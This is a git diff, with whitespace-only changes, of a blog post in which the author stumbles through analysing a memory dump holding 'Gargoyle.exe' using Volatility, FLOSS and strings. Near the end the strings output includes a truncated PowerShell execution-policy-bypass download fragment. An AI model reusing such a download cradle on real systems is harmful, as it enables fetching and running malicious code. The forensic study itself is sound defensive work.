@@ -10,13 +10,14 @@ largeimage: /images/avatar.jpg
 
 ## Why am I here?
 
-This handy [tweet](https://twitter.com/sibertor/status/1223789489300086785) was posted on twitter sharing a memory dump to look into. I don't do much of any memory analysis at work, so I figured I'd stumble through this, write what I found, and see if I can get any better at it.
+This handy [tweet](https://twitter.com/sibertor/status/1223789489300086785) was posted on twitter sharing a memory dump to look into. I don't do much of any memory analysis at work, so I figured I'd stumble through this, write what I found, and see if I can get any better at it. 
 
 ## Here I go
 
-After downloading it, I was off to google. "analyze dmp file windows" got me to this Microsoft doc which asked me to install symbol files properly. This doesn't seem to be the route I want to take, so my next search was "dumpit windows memory" which led me to [this article](https://zeltser.com/memory-acquisition-with-dumpit-for-dfir-2/) by Lenny Zeltser. It mentions that you can review dmp files with tools like Volatility, Rekall, and Redline. I used Redline in a training once, but Volatility is something I've only messed with, so here I go.
+After downloading it, I was off to google. "analyze dmp file windows" got me to this Microsoft doc which asked me to install symbol files properly. This doesn't seem to be the route I want to take, so my next search was "dumpit windows memory" which led me to [this article](https://zeltser.com/memory-acquisition-with-dumpit-for-dfir-2/) by Lenny Zeltser. It mentions that you can review dmp files with tools like Volatility, Rekall, and Redline. I used Redline in a training once, but Volatility is something I've only messed with, so here I go. 
 
-A link in the article took me to the Github repo [here](https://github.com/volatilityfoundation/volatility), and I clicked around reading directions until I found the [usage page](https://github.com/volatilityfoundation/volatility/wiki/Volatility-Usage), which seems about as Quickstart as I'm going to get. I need to specify a profile and I want to make sure Volatility can at least read the image. I'm going to run the `imageinfo` argument to make sure Volatility can read it. Volatility offers a standalone executable which seems to be the quickest of the quick starts.
+
+A link in the article took me to the Github repo [here](https://github.com/volatilityfoundation/volatility), and I clicked around reading directions until I found the [usage page](https://github.com/volatilityfoundation/volatility/wiki/Volatility-Usage), which seems about as Quickstart as I'm going to get. I need to specify a profile and I want to make sure Volatility can at least read the image. I'm going to run the `imageinfo` argument to make sure Volatility can read it. Volatility offers a standalone executable which seems to be the quickest of the quick starts. 
 
 ~~~
 PS C:\Users\computer\Downloads> .\volatility_2.6_win64_standalone\volatility_2.6_win64_standalone.exe imageinfo -f .\WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64_18362
@@ -24,7 +25,7 @@ Volatility Foundation Volatility Framework 2.6
 ERROR   : volatility.debug    : Invalid profile Win10x64_18362 selected
 ~~~
 
-So that's an invalid profile, back to the usage page and it seems I don't need to be that specific and Windows10x64 should work fine.
+So that's an invalid profile, back to the usage page and it seems I don't need to be that specific and Windows10x64 should work fine. 
 
 ~~~
 PS C:\Users\computer\Downloads> .\volatility_2.6_win64_standalone\volatility_2.6_win64_standalone.exe imageinfo -f .\WINDEV1912EVAL-20200201-010753_Gargoyle.dmp --profile=Win10x64
@@ -53,11 +54,12 @@ PS C:\Users\computer\Downloads>
 ~~~
 
 OK OK so this isn't working out. No processes listed, I'm gonna read the docs again. I went ahead and followed the installation instructions instead of the using the standalone executable. I only had python 3 installed, so installed [python 2 alongside it](https://spapas.github.io/2017/12/20/python-2-3-windows/
-).  This is what I get for booting into Windows. After messing with it for a while and running into uninstalled python pip packages, going into a virtual environment, getting build errors while installing packages, I threw my hands up and booted into linux where I'm more comfortable anyway.
+).  This is what I get for booting into Windows. After messing with it for a while and running into uninstalled python pip packages, going into a virtual environment, getting build errors while installing packages, I threw my hands up and booted into linux where I'm more comfortable anyway. 
+
 
 ## Back on Familiar Ground
 
-Python 2 and 3 are installed already once I boot into Kubuntu, and after simply cloning the repo and a quick `pip install distorm3`, things worked out of the box! Now the more specific profile is available, which is great. I imagine the problem is memory is mapped differently between Windows versions, and while it is technically Windows 10 64 bit, minor changes mean the parts we're expecting to see aren't where we'd expect them to be.
+Python 2 and 3 are installed already once I boot into Kubuntu, and after simply cloning the repo and a quick `pip install distorm3`, things worked out of the box! Now the more specific profile is available, which is great. I imagine the problem is memory is mapped differently between Windows versions, and while it is technically Windows 10 64 bit, minor changes mean the parts we're expecting to see aren't where we'd expect them to be. 
 
 ~~~
 [computer@desktop:~/gits/volatility] 
@@ -102,7 +104,8 @@ Name                                                  Pid   PPid   Thds   Hnds T
 .. 0xffffb10843feb480:svchost.exe                    6760    768      5      0 2020-01-31 21:37:38 UTC+0000
 ~~~
 
-So in the full process listing, I find Gargoyle.exe pretty quick. Let's extract it.
+So in the full process listing, I find Gargoyle.exe pretty quick. Let's extract it. 
+
 
 ~~~
  0xffffb108424624c0:winlogon.exe                      948   6956      7      0 2020-01-31 21:38:24 UTC+0000
@@ -136,6 +139,7 @@ be4a359fba64538edca476d04e49641fb2422958af0fa0b7f1ae0e34d5678a89  /tmp/executabl
 ~~~
 
 Checking the hash in Virustotal returns nothing and I'm not going to upload it to avoid spoiling someone else's fun, so I guess I need to research more. I'm going to dump the command lines of running processes.
+
 
 ~~~
 [computer@desktop:~/gits/volatility] 
@@ -197,10 +201,11 @@ mshtml.dll
 setup.pic
 ~~~
 
+
 ## Really Digging in and Getting Lost
 
 So let's go ahead and dump the memory of the process and see what we find, inspired by this [article](https://www.andreafortuna.org/2018/03/02/volatility-tips-extract-text-typed-in-a-notepad-window-from-a-windows-memory-dump/).  Again, I'm dumping to /tmp with this syntax `$ python2 vol.py --plugins=~/gits/plugins/ --profile=Win10x64_18362 -f ~/Desktop/WINDEV1912EVAL-20200201-010753_Gargoyle.dmp memdump -p 8116 --dump-dir=/tmp
-`. Then I'm going to download [floss](https://github.com/fireeye/flare-floss/) and take a look at it, hopefully deobfuscating some strings as I look at them.
+`. Then I'm going to download [floss](https://github.com/fireeye/flare-floss/) and take a look at it, hopefully deobfuscating some strings as I look at them. 
 
 ~~~
 
@@ -210,7 +215,7 @@ ERROR:floss:FLOSS cannot extract obfuscated strings or stackstrings from files l
 [computer@desktop:~/gits/volatility] 
 ~~~
 
-That's unfortunate. I'm going to use good ol fashioned strings, with the -n 8 flag to tell it to show me only lines 8 characters or longer. You seem to get a lot of 4 character junk from strings, so this eliminates it, and then I'll dial it back if I don't get anything interest, to 6 and then drop the flag entirely. When I send it to less, I immediately look for known suspicious keywords, `http`, `powershell`, `script`, even `//` sometimes. Things that look like base64, I drop into CyberChef and see if they decode. If they don't, I delete leading characters one by one because you never know where a string got truncated. As I'm scanning this I found a bunch of interesting things, certificates (likely from browsing the web?), all sorts of command line syntax, bits and pieces of applications, and then what I guess is maybe AV Signatures of some kind???
+That's unfortunate. I'm going to use good ol fashioned strings, with the -n 8 flag to tell it to show me only lines 8 characters or longer. You seem to get a lot of 4 character junk from strings, so this eliminates it, and then I'll dial it back if I don't get anything interest, to 6 and then drop the flag entirely. When I send it to less, I immediately look for known suspicious keywords, `http`, `powershell`, `script`, even `//` sometimes. Things that look like base64, I drop into CyberChef and see if they decode. If they don't, I delete leading characters one by one because you never know where a string got truncated. As I'm scanning this I found a bunch of interesting things, certificates (likely from browsing the web?), all sorts of command line syntax, bits and pieces of applications, and then what I guess is maybe AV Signatures of some kind??? 
 
 ~~~
 
@@ -261,6 +266,6 @@ P/webservices/public/saml2assertionconsumer.php','%tmp%\
 executionpolicybypass(new-objectsystem.net.webclient).downloadfile('http://
 ~~~
 
-Anyway, at this point, I'm way past knowing exactly what I'm looking at, but I thought this exercise was interesting and really appreciate the work that went into making this available. In the course of this process, I ran into [this article](https://blog.f-secure.com/hunting-for-gargoyle-memory-scanning-evasion/) which was fascinating but I don't know what it could have gotten me I didn't already get?
+Anyway, at this point, I'm way past knowing exactly what I'm looking at, but I thought this exercise was interesting and really appreciate the work that went into making this available. In the course of this process, I ran into [this article](https://blog.f-secure.com/hunting-for-gargoyle-memory-scanning-evasion/) which was fascinating but I don't know what it could have gotten me I didn't already get? 
 
-Maybe Gargoyle looks different depending on when you do the dump, but good on them, their plugin at least ran and did confirm Gargoyle.exe was likely Gargoyle. Maybe I'm so clueless I can't tell that people like them already did the hard work and its been integrated into volatility and I can just show up not having a clue what I'm doing and feel like I accomplished something. Thanks to everyone who went through so much trouble doing this so I could stumble through this in about an hour and a half over 2 nights.
+Maybe Gargoyle looks different depending on when you do the dump, but good on them, their plugin at least ran and did confirm Gargoyle.exe was likely Gargoyle. Maybe I'm so clueless I can't tell that people like them already did the hard work and its been integrated into volatility and I can just show up not having a clue what I'm doing and feel like I accomplished something. Thanks to everyone who went through so much trouble doing this so I could stumble through this in about an hour and a half over 2 nights. 
